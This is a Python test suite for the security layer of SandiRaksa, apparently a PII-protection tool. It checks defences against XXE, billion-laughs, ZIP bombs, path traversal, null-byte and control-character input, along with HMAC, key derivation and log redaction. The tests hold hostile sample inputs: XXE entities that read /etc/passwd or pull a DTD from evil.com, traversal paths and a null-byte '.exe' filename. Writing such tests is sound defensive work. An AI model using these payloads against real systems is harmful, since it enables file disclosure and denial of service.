"""
Security Tests for SandiRaksa.

Tests to verify security properties and resistance to attacks.
"""

from __future__ import annotations

import tempfile
import zipfile
from pathlib import Path

import pytest


class TestXMLSecurity:
    """Tests for XML security (XXE prevention)."""

    def test_xxe_external_entity_blocked(self):
        """Test XXE external entity attack is blocked."""
        from sandiraksa.security import XMLSecurityError, parse_xml_safely
        
        # XXE attack payload
        xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>'''
        
        with pytest.raises(XMLSecurityError) as exc_info:
            parse_xml_safely(xxe_payload)
        
        assert "DOCTYPE" in str(exc_info.value) or "ENTITY" in str(exc_info.value)

    def test_xxe_parameter_entity_blocked(self):
        """Test XXE parameter entity attack is blocked."""
        from sandiraksa.security import XMLSecurityError, parse_xml_safely
        
        xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">
  %xxe;
]>
<root>test</root>'''
        
        with pytest.raises(XMLSecurityError):
            parse_xml_safely(xxe_payload)

    def test_billion_laughs_mitigated(self):
        """Test billion laughs attack is mitigated by size limit."""
        from sandiraksa.security import SecurityConfig, XMLSecurityError, parse_xml_safely
        
        # Billion laughs attack (entity expansion)
        # Note: Python's ElementTree doesn't expand entities by default,
        # but we still block DOCTYPE declarations
        billion_laughs = '''<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
]>
<lolz>&lol2;</lolz>'''
        
        config = SecurityConfig(max_xml_size=1000)
        
        with pytest.raises(XMLSecurityError):
            parse_xml_safely(billion_laughs, config)


class TestZipSecurity:
    """Tests for ZIP security (ZIP bomb prevention)."""

    def test_high_compression_ratio_detected(self):
        """Test high compression ratio is flagged."""
        from sandiraksa.security import SecurityConfig, check_zip_bomb
        
        with tempfile.TemporaryDirectory() as tmpdir:
            zip_path = Path(tmpdir) / "suspicious.zip"
            
            # Create a file with highly compressible content
            with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
                # Highly compressible: repeated characters
                zf.writestr("big.txt", "A" * 100000)
            
            # With strict config
            config = SecurityConfig(max_zip_ratio=10.0)
            is_safe, warning = check_zip_bomb(zip_path, config)
            
            # Should flag high compression ratio
            if not is_safe:
                assert "ratio" in warning.lower()

    def test_many_files_detected(self):
        """Test too many files is flagged."""
        from sandiraksa.security import SecurityConfig, check_zip_bomb
        
        with tempfile.TemporaryDirectory() as tmpdir:
            zip_path = Path(tmpdir) / "many_files.zip"
            
            with zipfile.ZipFile(zip_path, "w") as zf:
                for i in range(100):
                    zf.writestr(f"file{i}.txt", f"content {i}")
            
            config = SecurityConfig(max_zip_files=50)
            is_safe, warning = check_zip_bomb(zip_path, config)
            
            assert is_safe is False
            assert "many files" in warning.lower()

    def test_valid_zip_passes(self):
        """Test normal ZIP passes security check."""
        from sandiraksa.security import check_zip_bomb
        
        with tempfile.TemporaryDirectory() as tmpdir:
            zip_path = Path(tmpdir) / "normal.zip"
            
            with zipfile.ZipFile(zip_path, "w") as zf:
                zf.writestr("doc.txt", "Normal document content here.")
                zf.writestr("data.csv", "col1,col2\n1,2\n3,4")
            
            is_safe, warning = check_zip_bomb(zip_path)
            
            assert is_safe is True
            assert warning == ""


class TestInputValidation:
    """Tests for input validation security."""

    def test_path_traversal_blocked(self):
        """Test path traversal attempts are blocked."""
        from sandiraksa.security import validate_file_path
        
        # Various path traversal attempts
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config",
            "folder/../../../secret",
        ]
        
        for path in malicious_paths:
            is_valid, error = validate_file_path(path)
            # Should either fail validation or resolve safely
            # (nonexistent file is also a valid failure)
            assert is_valid is False or "not exist" in error.lower()

    def test_null_byte_injection_blocked(self):
        """Test null byte injection is handled."""
        from sandiraksa.security import sanitize_filename
        
        malicious = "document.pdf\x00.exe"
        result = sanitize_filename(malicious)
        
        assert "\x00" not in result

    def test_control_characters_blocked(self):
        """Test control characters in input are blocked."""
        from sandiraksa.security import validate_input_text
        
        # Various control characters
        malicious_texts = [
            "normal\x00text",  # Null byte
            "text\x07bell",  # Bell
            "escape\x1b[31m",  # ANSI escape
        ]
        
        for text in malicious_texts:
            is_valid, error = validate_input_text(text, allow_control_chars=False)
            assert is_valid is False

    def test_oversized_input_blocked(self):
        """Test oversized inputs are blocked."""
        from sandiraksa.security import validate_input_text
        
        huge_text = "x" * 1000000
        
        is_valid, error = validate_input_text(huge_text, max_length=10000)
        
        assert is_valid is False
        assert "long" in error.lower()


class TestCryptoSecurity:
    """Tests for cryptographic security."""

    def test_hmac_deterministic(self):
        """Test HMAC is deterministic for same inputs."""
        from sandiraksa.security import compute_hmac
        
        key = b"test-key-32-bytes-for-hmac!"
        data = b"test data"
        
        result1 = compute_hmac(key, data)
        result2 = compute_hmac(key, data)
        
        assert result1 == result2

    def test_hmac_different_keys(self):
        """Test HMAC produces different output for different keys."""
        from sandiraksa.security import compute_hmac
        
        key1 = b"key-one-32-bytes-for-hmac-test!"
        key2 = b"key-two-32-bytes-for-hmac-test!"
        data = b"test data"
        
        result1 = compute_hmac(key1, data)
        result2 = compute_hmac(key2, data)
        
        assert result1 != result2

    def test_hmac_different_data(self):
        """Test HMAC produces different output for different data."""
        from sandiraksa.security import compute_hmac
        
        key = b"test-key-32-bytes-for-hmac!"
        
        result1 = compute_hmac(key, b"data1")
        result2 = compute_hmac(key, b"data2")
        
        assert result1 != result2

    def test_secure_compare_timing_safe(self):
        """Test secure compare is available."""
        from sandiraksa.security import secure_compare
        
        # Should work correctly
        assert secure_compare(b"test", b"test") is True
        assert secure_compare(b"test", b"different") is False
        assert secure_compare(b"", b"") is True

    def test_key_derivation_produces_correct_length(self):
        """Test key derivation produces correct length key."""
        from sandiraksa.security import KEY_SIZE, derive_key
        
        key, salt = derive_key("password123")
        
        assert len(key) == KEY_SIZE
        assert len(salt) == 16  # Standard salt length

    def test_key_derivation_different_salts(self):
        """Test key derivation with same password produces different keys."""
        from sandiraksa.security import derive_key
        
        key1, salt1 = derive_key("password123")
        key2, salt2 = derive_key("password123")
        
        # Different salts should produce different keys
        assert salt1 != salt2
        assert key1 != key2


class TestTokenSecurity:
    """Tests for token-related security."""

    def test_token_format_validated(self):
        """Test token format is properly structured."""
        from sandiraksa.domain import TOKEN_PATTERN
        import re
        
        pattern = re.compile(TOKEN_PATTERN)
        
        # Valid tokens
        assert pattern.match("[[EMAIL_ABC123]]")
        assert pattern.match("[[PERSON_7F31A2]]")
        assert pattern.match("[[ID_NIK_DEADBEEF]]")
        
        # Invalid tokens
        assert not pattern.match("EMAIL_ABC123")
        assert not pattern.match("[[ABC123]]")
        assert not pattern.match("[[EMAIL]]")


class TestLoggingSecurity:
    """Tests for logging security (PII redaction)."""

    def test_pii_redacted_from_logs(self):
        """Test PII is redacted from log messages."""
        from sandiraksa.app.logging import PIIRedactionFilter
        
        pii_filter = PIIRedactionFilter()
        
        sensitive_texts = [
            ("Email: test@example.com", "EMAIL_REDACTED"),
            ("Phone: +62 812 3456 7890", "PHONE_REDACTED"),
            ("NIK: 3201234567890123", "NIK_REDACTED"),
            ("IP: 192.168.1.100", "IP_REDACTED"),
        ]
        
        for text, expected_marker in sensitive_texts:
            result = pii_filter._redact(text)
            assert expected_marker in result, f"Failed to redact PII in: {text}"

    def test_normal_text_not_redacted(self):
        """Test normal text is not incorrectly redacted."""
        from sandiraksa.app.logging import PIIRedactionFilter
        
        pii_filter = PIIRedactionFilter()
        
        normal_texts = [
            "Processing file: document.csv",
            "Found 5 findings in row 10",
            "Protection completed successfully",
            "Token created for entity",
        ]
        
        for text in normal_texts:
            result = pii_filter._redact(text)
            assert result == text, f"Normal text was incorrectly modified: {text}"
